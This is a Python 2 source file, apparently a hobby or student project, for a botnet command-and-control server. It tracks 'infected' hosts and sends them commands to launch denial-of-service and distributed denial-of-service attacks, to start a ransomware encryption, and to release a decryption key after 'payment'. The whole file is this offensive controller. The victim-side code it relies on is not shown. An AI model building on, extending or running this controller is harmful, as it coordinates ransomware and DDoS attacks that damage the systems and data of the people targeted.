import socket
import os
from threading import Thread
from messenger import *
from time import sleep

LISTEN_PORT = 3838
VICTIM_PORT = 4848


def ransomeware_attack(payload):
    print "Beginning Ransomeware Attack"
    infected_ip = str(payload.split(",")[1])
    msg_contents = "RANSOMEWARE,"
    Messenger.send_message(infected_ip, VICTIM_PORT, msg_contents)
    print "Encypted Files"


def send_decrypt_key(payload):
    print "Receieved Payment"
    print "Sending Key to unencrypt files"
    infected_ip = str(payload.split(",")[1])
    msg_contents = "DECRYPT"
    Messenger.send_message(str(infected_ip), VICTIM_PORT, msg_contents)


def send_dos_attack(payload):
    infected_ip = str(payload.split(",")[1])
    msg_contents = "DOS," + ",".join(str(i) for i in payload.split(",")[2:])
    Messenger.send_message(infected_ip, VICTIM_PORT, msg_contents)
    print "DOS'ed: %s" % str(msg_contents)


def send_ddos_attack(payload):
    target_ip = str(payload.split(",")[1])
    msg_contents = "DOS," + target_ip
    for bot in botnet:
        Messenger.send_message(bot, VICTIM_PORT, msg_contents)
    print "DDOS'd attack to ip: %s" % str(target_ip)


def add_new_victim(victim_ip):
    print "Adding %s to our Infected List" % str(victim_ip)
    botnet.append(str(victim_ip))


def list_infected():
    for infected in botnet:
        print "Infected: %s" % str(infected)


def listen_for_response():
    s = Messenger.set_up_listening_socket(LISTEN_PORT)
    while True:
        data, victim = s.recvfrom(8192)
        print "Response from IP: %s" % (str(victim[0]))
        print data
        command_dict[str(data)](str(victim[0]))
    s.close()


def quit_all():
    os.system('kill -9 %d' % os.getpid())


def main():
    global botnet
    botnet = ["127.0.0.1"]

    listen_thread = Thread(None, listen_for_response,)
    listen_thread.start()

    while True:
        command = str(raw_input("Enter a command to run: ")).replace(" ", "")
        try:
            if len(command) == 4:
                # Either a LIST or EXIT command
                command_dict[command]()
            else:
                command_type = str(command.split(",")[0])
                command_dict[command_type](command)
        except:
            print ("Invalid. Try again")

    listen_thread.join()


command_dict = {"LIST": list_infected,
                "JOIN": add_new_victim,
                "DOS": send_dos_attack,
                "RANS": ransomeware_attack,
                "DECRYPT": send_decrypt_key,
                "DDOS": send_ddos_attack,
                "EXIT": quit_all
                }

if __name__ == '__main__':
    main()
